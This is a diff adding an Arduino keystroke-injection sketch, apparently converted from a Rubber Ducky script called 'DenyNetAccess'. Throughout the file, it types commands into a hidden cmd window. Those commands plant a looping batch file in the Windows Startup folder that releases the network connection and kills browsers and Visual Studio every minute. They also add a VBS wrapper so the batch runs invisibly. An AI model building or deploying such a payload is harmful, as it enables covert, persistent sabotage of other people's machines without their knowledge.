@@ -1,0 +1,145 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // Author: overwraith
+  // A new DenyNetAccess program that employs window hiding techniques.
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  Keyboard.print(F("cmd /Q /D /T:7F /F:OFF /V:OFF /K"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(750);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print(F("M"));
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  // A Different directory in case the second one is inaccessable
+  delay(750);
+  Keyboard.print(F("cd %userprofile%\\Downloads\\"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("cd C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"));
+
+  typeKey(KEY_RETURN);
+
+  // Delete batch file if already exists
+  Keyboard.print(F("erase /Q a.bat"));
+
+  typeKey(KEY_RETURN);
+
+  // Make the batch file
+  Keyboard.print(F("copy con a.bat"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("@echo off"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F(":Start"));
+
+  typeKey(KEY_RETURN);
+
+  // Release Networking INformation
+  Keyboard.print(F("ipconfig /release"));
+
+  typeKey(KEY_RETURN);
+
+  // 2 Generic Browsers
+  Keyboard.print(F("taskkill /f /im \"iexplore.exe\""));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("taskkill /f /im \"firefox.exe\""));
+
+  typeKey(KEY_RETURN);
+
+  // Microsoft Visual Studio 2010
+  Keyboard.print(F("taskkill /f /im \"devenv.exe\""));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("timeout /t 60"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("Goto Start"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  // MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
+  // Delete vbs file if already exists
+  Keyboard.print(F("erase /Q invis.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  // FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+  Keyboard.print(F("copy con invis.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  // RUN THE BATCH FILE
+  Keyboard.print(F("wscript.exe invis.vbs a.bat"));
+
+  typeKey(KEY_RETURN);
+
+  // Close the cmd prompt.
+  Keyboard.print(F("EXIT"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
